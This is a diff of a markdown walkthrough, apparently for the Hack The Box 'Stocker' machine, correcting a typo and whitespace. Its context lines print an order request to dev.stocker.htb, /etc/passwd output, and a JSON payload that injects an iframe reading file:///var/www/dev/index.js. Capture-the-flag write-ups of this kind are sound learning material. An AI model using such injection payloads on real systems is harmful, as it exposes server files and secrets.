@@ -152,7 +152,7 @@ Additional information, enumerating the website:
 * API - /api/products, /api/po/${response.orderId}, /api/order
 
 
-Sending the order information to figure out the fllow.
+Sending the order information to figure out the flow.
 ```
 POST /api/order HTTP/1.1
 Host: dev.stocker.htb
@@ -199,11 +199,10 @@ red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2}]
 root:x:0:0:root:/root:/bin/bash
 ...
 angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
-
 ```
+
 Checking the current `index.js` file
 ```
-
 {"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup<iframe src='file:///var/www/dev/index.js' width='1000' height='1000'></iframe>","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":2}]}
 
 ...
